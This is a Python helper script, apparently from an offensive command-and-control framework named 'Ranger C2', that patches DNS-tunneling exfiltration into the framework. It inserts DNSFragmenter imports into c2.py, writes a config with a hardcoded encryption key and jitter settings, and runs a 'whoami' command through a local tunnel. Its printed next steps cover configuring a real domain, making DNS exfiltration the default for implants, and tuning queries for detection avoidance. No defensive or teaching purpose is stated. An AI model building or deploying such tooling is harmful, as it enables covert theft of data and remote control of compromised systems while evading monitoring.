#!/usr/bin/env python3
"""
Fix DNS tunneling integration for Ranger C2
"""

import os
import sys
import time
import threading
import socket
import json
from pathlib import Path

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

def check_dns_module():
    """Check if DNS module is available and working."""
    try:
        from payloads.dnstunnel import DNSFragmenter, DNSTunnel
        print("✅ DNS tunnel module loaded successfully")
        return True
    except ImportError as e:
        print(f"❌ DNS tunnel module import error: {e}")
        return False
    except Exception as e:
        print(f"❌ DNS tunnel module error: {e}")
        return False

def test_dns_fragmenter():
    """Test DNS fragmenter functionality."""
    try:
        from payloads.dnstunnel import DNSFragmenter
        
        fragmenter = DNSFragmenter("test.rogue-c2.com")
        test_data = b"Test data for DNS tunneling"
        
        # Test fragmentation
        success = fragmenter.fragment_and_send(test_data, filename="test.txt", session_id="test123")
        
        if success:
            print("✅ DNS fragmenter test passed")
            return True
        else:
            print("❌ DNS fragmenter test failed")
            return False
            
    except Exception as e:
        print(f"❌ DNS fragmenter test error: {e}")
        return False

def start_dns_server():
    """Start DNS server for testing."""
    try:
        from payloads.dnstunnel import DNSTunnel
        
        print("Starting DNS server on port 5353...")
        tunnel = DNSTunnel(
            domain="test.rogue-c2.com",
            mode="server",
            listen_ip="127.0.0.1",
            listen_port=5353
        )
        
        # Start in background thread
        server_thread = threading.Thread(target=tunnel.start_server, daemon=True)
        server_thread.start()
        
        print("✅ DNS server started")
        return tunnel, server_thread
        
    except Exception as e:
        print(f"❌ DNS server start error: {e}")
        return None, None

def test_dns_client():
    """Test DNS client functionality."""
    try:
        from payloads.dnstunnel import DNSTunnel
        
        tunnel = DNSTunnel(
            domain="test.rogue-c2.com",
            mode="client",
            upstream_dns="127.0.0.1"
        )
        
        # Test with fragmentation
        print("Testing DNS client with fragmentation...")
        response = tunnel.send_command("whoami", use_fragmentation=True)
        print(f"Response: {response}")
        
        return True
        
    except Exception as e:
        print(f"❌ DNS client test error: {e}")
        return False

def check_c2_integration():
    """Check C2 integration with DNS."""
    c2_path = Path(__file__).parent / "c2.py"
    
    if not c2_path.exists():
        print("❌ C2.py not found")
        return False
    
    with open(c2_path, 'r') as f:
        content = f.read()
    
    # Check for DNS integration
    checks = [
        ("DNS_AVAILABLE" in content, "DNS availability check"),
        ("DNSExfilManager" in content, "DNS exfil manager class"),
        ("DNS_LISTEN_PORT" in content, "DNS listen port"),
        ("dns_tunnels" in content, "DNS tunnels dictionary"),
        ("exfil_queue" in content, "Exfil queue"),
    ]
    
    all_passed = True
    for check_passed, check_name in checks:
        if check_passed:
            print(f"✅ {check_name}")
        else:
            print(f"❌ {check_name}")
            all_passed = False
    
    return all_passed

def fix_dns_imports():
    """Fix DNS imports in C2."""
    c2_path = Path(__file__).parent / "c2.py"
    
    try:
        with open(c2_path, 'r') as f:
            lines = f.readlines()
        
        # Find the DNS import section
        dns_import_found = False
        for i, line in enumerate(lines):
            if "from dnstunnel import" in line or "import dnstunnel" in line:
                dns_import_found = True
                break
        
        if not dns_import_found:
            print("❌ DNS imports not found in c2.py")
            
            # Find where to add imports (after other imports)
            import_end = 0
            for i, line in enumerate(lines):
                if line.strip() and not line.startswith(('import ', 'from ', '#')):
                    import_end = i
                    break
            
            # Add DNS import
            dns_import = """# Try to import DNS tunnel module from payloads
try:
    sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
    from dnstunnel import DNSFragmenter, DNSListener
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[!] DNS tunnel module not found. Exfiltration will use HTTPS only.")
"""
            
            lines.insert(import_end, dns_import)
            
            with open(c2_path, 'w') as f:
                f.writelines(lines)
            
            print("✅ Added DNS imports to c2.py")
            return True
        else:
            print("✅ DNS imports already present")
            return True
            
    except Exception as e:
        print(f"❌ Error fixing DNS imports: {e}")
        return False

def create_dns_config():
    """Create DNS configuration file."""
    config_path = Path(__file__).parent / "dns_config.json"
    
    config = {
        "enabled": True,
        "domain": "rogue-c2.example.com",
        "listen_port": 5353,
        "upstream_dns": "8.8.8.8",
        "encryption_key": "RogueDNSTunnel2024",
        "chunk_size": 60,
        "jitter_min": 0.5,
        "jitter_max": 1.5,
        "max_chunks_per_session": 100,
        "session_timeout": 300
    }
    
    try:
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        print("✅ DNS configuration created")
        return True
    except Exception as e:
        print(f"❌ Error creating DNS config: {e}")
        return False

def test_full_integration():
    """Test full DNS tunneling integration."""
    print("\n" + "="*60)
    print("Testing full DNS tunneling integration")
    print("="*60)
    
    # Step 1: Check module
    if not check_dns_module():
        return False
    
    # Step 2: Fix imports
    if not fix_dns_imports():
        return False
    
    # Step 3: Check C2 integration
    if not check_c2_integration():
        return False
    
    # Step 4: Create config
    if not create_dns_config():
        return False
    
    # Step 5: Test fragmenter
    if not test_dns_fragmenter():
        return False
    
    # Step 6: Start DNS server
    tunnel, server_thread = start_dns_server()
    if not tunnel:
        return False
    
    # Give server time to start
    time.sleep(2)
    
    # Step 7: Test client
    if not test_dns_client():
        return False
    
    print("\n" + "="*60)
    print("✅ DNS tunneling integration complete!")
    print("="*60)
    print("\nNext steps:")
    print("1. Configure real domain with wildcard DNS (*.your-domain.com)")
    print("2. Update C2 to use DNS exfiltration by default")
    print("3. Test with real implant")
    print("4. Monitor DNS queries for detection avoidance")
    
    return True

def main():
    """Main function."""
    print("Ranger C2 DNS Tunneling Fix")
    print("="*60)
    
    success = test_full_integration()
    
    if success:
        print("\n✅ All DNS tunneling tests passed!")
        print("\nTo enable DNS tunneling in production:")
        print("1. Edit c2.py and set DNS_AVAILABLE = True")
        print("2. Configure domain in dns_config.json")
        print("3. Start C2 with --enable-dns flag")
        print("4. Update implants to use DNS exfiltration")
    else:
        print("\n❌ DNS tunneling tests failed")
        print("\nCheck the errors above and fix manually.")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())